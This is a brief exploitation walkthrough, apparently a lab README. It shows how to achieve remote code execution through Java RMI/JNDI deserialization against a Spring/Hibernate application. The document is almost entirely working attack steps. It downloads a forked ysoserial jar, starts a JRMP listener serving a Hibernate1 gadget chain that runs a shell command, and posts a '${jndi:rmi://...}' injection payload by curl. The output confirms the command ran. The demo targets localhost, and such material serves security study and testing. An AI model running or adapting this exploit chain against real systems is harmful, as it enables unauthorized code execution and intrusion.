# Exploiting RMI deserialization

## Download and run ysoserial

_All credits for [ysoserial](https://github.com/frohoff/ysoserial) go to https://github.com/frohoff/ysoserial we are using my fork as it supports the newest version of hibernate as well as shell execution (e.g. pipes) in a much more readable format. A similar result can be achieved by recompiling the original repo for hibernate and using payload encoding to encode a `sh -c ...` command._

```
$ wget https://github.com/uint0/ysoserial/releases/download/v0.0.6/ysoserial-0.0.6-SNAPSHOT-all.jar
$ java -Dhibernate5 -cp ysoserial-0.0.6-SNAPSHOT-all.jar \
    ysoserial.exploit.JRMPListener 9000 Hibernate1 \
    "echo yay > /tmp/pwnedagain"
```

## Send the payload

Assuming `spring-hibernate-ex`

```
$ rm /tmp/pwnedagain
$ curl -w '\n' -X POST localhost:8080 --data-binary '${jndi:rmi://127.0.0.1:9000/a}' -H 'Content-Type: text/plain'
$ cat /tmp/pwnedagain
yay
```


